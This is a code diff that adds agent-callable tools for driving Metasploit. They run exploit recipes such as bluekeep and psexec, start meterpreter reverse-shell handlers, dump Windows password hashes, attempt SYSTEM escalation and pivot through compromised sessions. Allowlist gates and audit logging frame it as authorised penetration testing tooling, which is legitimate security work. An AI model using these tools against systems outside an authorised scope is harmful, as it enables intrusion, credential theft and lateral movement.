@@ -5,6 +5,7 @@ from __future__ import annotations
 import subprocess
 
 from tools.mcp_tools.registry import *
+from tools.metasploit_bridge import MSF_RECIPES, get_msf_recipe
 
 
 def register_metasploit_tools(mcp: Any, *, ctx: ToolContext) -> None:
@@ -355,6 +356,136 @@ def register_metasploit_tools(mcp: Any, *, ctx: ToolContext) -> None:
                 f"OUTPUT:\n{result.get('output', '')[:2000]}"
             )
         return f"MSF_RESOURCE_FAILED: {result.get('error', 'unknown error')}"
+
+    # ── Phase 3: recipe dispatch + handler orchestration + post wrappers ──
+
+    def _listener_cfg() -> dict[str, Any]:
+        return ((config or {}).get("exploit", {}) or {}).get("msf", {}) or {}
+
+    def _msf_enabled(key: str, default: bool = False) -> bool:
+        return bool(_listener_cfg().get(key, default))
+
+    @mcp.tool()
+    @audit_tool
+    def msf_run_recipe(name: str, target_ip: str = "", session_id: int = 0, options: str = "") -> str:
+        """Run a named Metasploit recipe (curated module+option preset). Recipes: smb_version, bluekeep, psexec, cred_gather_win, local_exploit_suggester, hashdump, getsystem, handler. Pass target_ip for exploit/auxiliary kinds, session_id for post kinds, and extra key=value options to override the preset."""
+        if not _msf_enabled("recipes_enabled", False):
+            return f"BLOCKED: msf.recipes_enabled is disabled. Recipe: {name}"
+        recipe = get_msf_recipe(name)
+        if not recipe:
+            return f"BLOCKED: unknown MSF recipe {name!r}. Available: {', '.join(sorted(MSF_RECIPES))}"
+        # Allowlist gate: target_ip (exploit/auxiliary) and any RHOSTS in options.
+        dests: list[str] = [target_ip] if target_ip else []
+        opts: dict[str, str] = {}
+        if options.strip():
+            for item in options.strip().split():
+                if "=" in item:
+                    k, v = item.split("=", 1)
+                    opts[k] = v
+                    if k.upper() in ("RHOSTS", "RHOST"):
+                        dests.append(v)
+        allowed, reason = check_targets_allowlist(dests, config)
+        if not allowed:
+            return f"BLOCKED: {reason}\nTOOL: msf_run_recipe\nRECIPE: {name}"
+        bridge = _get_msf_bridge()
+        result = bridge.run_recipe(name, target_ip, session_id, opts)
+        if result.get("success"):
+            return (
+                f"MSF_RECIPE_RESULT: {name}\n"
+                f"MODULE: {recipe['module']}\n"
+                f"KIND: {recipe['kind']}\n"
+                f"OUTPUT:\n{result.get('output', '')[:2000]}"
+            )
+        return f"MSF_RECIPE_FAILED: {result.get('error', 'unknown error')}"
+
+    @mcp.tool()
+    @audit_tool
+    def msf_start_handler(lhost: str, lport: int = 4444, payload: str = "windows/meterpreter/reverse_tcp", options: str = "") -> str:
+        """Start exploit/multi/handler as a backgrounded job to catch a generated payload. lhost is the operator callback host (must be in allowed_targets). Pairs with msf_generate_payload: generate a reverse payload, then start a handler on the same LHOST/LPORT."""
+        # Allowlist gate: lhost is the payload's callback host (operator box).
+        allowed, reason = check_targets_allowlist([lhost], config)
+        if not allowed:
+            return f"BLOCKED: {reason}\nTOOL: msf_start_handler\nLHOST: {lhost}"
+        bridge = _get_msf_bridge()
+        opts: dict[str, str] = {}
+        if options.strip():
+            for item in options.strip().split():
+                if "=" in item:
+                    k, v = item.split("=", 1)
+                    opts[k] = v
+        result = bridge.start_handler(lhost, lport, payload, opts)
+        if result.get("success"):
+            return (
+                f"MSF_HANDLER_STARTED\n"
+                f"LHOST: {lhost}\nLPORT: {lport}\nPAYLOAD: {payload}\n"
+                f"OUTPUT:\n{result.get('output', '')[:1500]}"
+            )
+        return f"MSF_HANDLER_FAILED: {result.get('error', 'unknown error')}"
+
+    @mcp.tool()
+    @audit_tool
+    def msf_stop_handler() -> str:
+        """Stop all backgrounded handler jobs in the persistent msfconsole (jobs -K)."""
+        bridge = _get_msf_bridge()
+        result = bridge.stop_handler()
+        return (
+            f"MSF_HANDLER_STOPPED\n"
+            f"SUCCESS: {result.get('success', False)}\n"
+            f"OUTPUT:\n{result.get('output', '')[:500]}"
+        )
+
+    def _post_module(session_id: int, module: str, label: str, options: str = "") -> str:
+        """Shared runner for the meterpreter post wrappers."""
+        if int(session_id or 0) <= 0:
+            return f"BLOCKED: {label} requires a positive session_id."
+        bridge = _get_msf_bridge()
+        opts: dict[str, str] = {}
+        if options.strip():
+            for item in options.strip().split():
+                if "=" in item:
+                    k, v = item.split("=", 1)
+                    opts[k] = v
+        result = bridge.run_post_module(module, int(session_id), opts)
+        if result.get("success"):
+            return (
+                f"MSF_POST_RESULT: {label}\n"
+                f"SESSION: {session_id}\n"
+                f"OUTPUT:\n{result.get('output', '')[:2000]}"
+            )
+        return f"MSF_POST_FAILED: {result.get('error', 'unknown error')}"
+
+    @mcp.tool()
+    @audit_tool
+    def msf_post_hashdump(session_id: int) -> str:
+        """Dump SAM hashes from a Windows meterpreter session (post/windows/gather/hashdump)."""
+        return _post_module(session_id, "post/windows/gather/hashdump", "hashdump")
+
+    @mcp.tool()
+    @audit_tool
+    def msf_post_getsystem(session_id: int) -> str:
+        """Attempt SYSTEM elevation on a Windows meterpreter session (post/windows/escalate/getsystem)."""
+        return _post_module(session_id, "post/windows/escalate/getsystem", "getsystem")
+
+    @mcp.tool()
+    @audit_tool
+    def msf_post_portfwd(session_id: int, remote_host: str, remote_port: int, local_port: int = 0) -> str:
+        """Forward a local port through a meterpreter session to a remote host (portfwd). remote_host must be in allowed_targets (the allowlist is the pivot lock)."""
+        allowed, reason = check_targets_allowlist([remote_host], config)
+        if not allowed:
+            return f"BLOCKED: {reason}\nTOOL: msf_post_portfwd\nREMOTE: {remote_host}"
+        lp = int(local_port or 0)
+        return _post_module(session_id, "post/multi/manage/portfwd", "portfwd",
+                            f"remote_host={remote_host} remote_port={remote_port} local_port={lp}")
+
+    @mcp.tool()
+    @audit_tool
+    def msf_post_route(session_id: int, subnet: str) -> str:
+        """Add a route through a meterpreter session to a target subnet (post/multi/manage/autoroute). The subnet's network address must be in allowed_targets (pivot lock)."""
+        net = (subnet or "").split("/")[0].strip()
+        allowed, reason = check_targets_allowlist([net], config)
+        if not allowed:
+            return f"BLOCKED: {reason}\nTOOL: msf_post_route\nSUBNET: {subnet}"
+        return _post_module(session_id, "post/multi/manage/autoroute", "route", f"subnet={subnet}")
 
 
 
